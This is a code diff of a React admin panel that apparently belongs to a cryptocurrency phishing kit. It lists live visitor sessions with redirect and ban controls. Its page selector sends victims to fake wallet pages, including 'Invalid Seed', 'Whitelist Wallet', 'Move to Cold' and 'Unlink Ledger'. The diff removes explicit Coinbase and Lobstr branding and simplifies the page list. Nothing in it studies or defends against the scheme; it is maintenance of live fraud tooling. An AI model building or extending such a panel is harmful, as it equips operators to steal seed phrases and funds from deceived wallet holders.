@@ -4,8 +4,9 @@ import { useAdminSocket } from '../contexts/AdminSocket';
 import notificationSound from './notification.mp3';
 
 const ANIMAL_EMOJIS = [
-  '🐟', '🐠', '🐡','🐙', '🦈', '🐬',
-  '🦭','🦦'
+  '🦊', '🦁', '🐯', '🐶', '🐱', '🐼', '🐨', '🐮', '🐷', '🐸',
+  '🦄', '🐵', '🐰', '🦒', '🦘', '🦔', '🐻', '🐙', '🦈', '🐬',
+  '🦭', '🦩', '🦥', '🦦', '🦡', '🦃', '🦆', '🦅', '🐺', '🐝'
 ];
 
 const DeviceDetectorUtil = {
@@ -186,37 +187,30 @@ const MobileSessionCard = ({ session, onRedirect, onBan, onRemove, settings, isN
 };
 
 const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
-  const brandCategories = {
-    Coinbase: {
-      Introduction: [
-        { id: 'loading.html', name: 'Loading' },
-        { id: 'review.html', name: 'Review' },
-        { id: 'estimatedbalance.html', name: 'Estimated Balance' },
-        { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
-      ],
-      'Hardware Wallets': [
-        { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
-        { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
-        { id: 'MoveToCold.html', name: 'Move to Cold' }
-      ],
-      Awaiting: [
-        { id: 'Pendingreview.html', name: 'Pending Review' }
-      ],
-      'Completed Task': [
-        { id: 'Completed.html', name: 'Review Completed' },
-        { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
-      ],
-      Others: [
-        { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
-        { id: 'InvalidSeed.html', name: 'Invalid Seed' }
-      ]
-    },
-    Lobstr: {
-      Loading: [
-        { id: 'lobstrloading.html', name: 'Loading' }
-      ]
-    }
-  };
+  const pageCategories = {
+    Introduction: [
+      { id: 'loading.html', name: 'Loading' },
+      { id: 'review.html', name: 'Review' },
+      { id: 'estimatedbalance.html', name: 'Estimated Balance' },
+      { id: 'whitelistwallet.html', name: 'Whitelist Wallet' }
+    ],
+    'Hardware Wallets': [
+      { id: 'ledgerdisconnect.html', name: 'Unlink Ledger' },
+      { id: 'trezordisconnect.html', name: 'Unlink Trezor' },
+      { id: 'MoveToCold.html', name: 'Move to Cold' }
+    ],
+    Awaiting: [
+      { id: 'Pendingreview.html', name: 'Pending Review' }
+    ],
+    'Completed Task': [
+      { id: 'Completed.html', name: 'Review Completed' },
+      { id: 'WhitelistSuccessful.html', name: 'Whitelist Successful' }
+    ],
+    Others: [
+      { id: 'DisconnectWallet.html', name: 'Disconnect Wallet' },
+      { id: 'InvalidSeed.html', name: 'Invalid Seed' }
+    ]
+  }
 
   return (
     <div className="relative flex-shrink-0" style={{ maxWidth: '180px' }}>
@@ -238,16 +232,12 @@ const CategorizedPageSelect = ({ selectedPage, onPageChange, isHovered }) => {
           z-50
         `}
       >
-        {Object.entries(brandCategories).map(([brand, categories]) => (
-          <optgroup key={brand} label={`━━━ ${brand} ━━━`} className="bg-[#1A1A1A] text-white/80 font-bold">
-            {Object.entries(categories).map(([category, pages]) => (
-              <optgroup key={`${brand}-${category}`} label={`  ${category}`} className="bg-[#1A1A1A] text-white/60">
-                {pages.map(page => (
-                  <option key={page.id} value={page.id} className="bg-[#1A1A1A]">
-                    {page.name}
-                  </option>
-                ))}
-              </optgroup>
+        {Object.entries(pageCategories).map(([category, pages]) => (
+          <optgroup key={category} label={category} className="bg-[#1A1A1A] text-white/60">
+            {pages.map(page => (
+              <option key={page.id} value={page.id} className="bg-[#1A1A1A]">
+                {page.name}
+              </option>
             ))}
           </optgroup>
         ))}
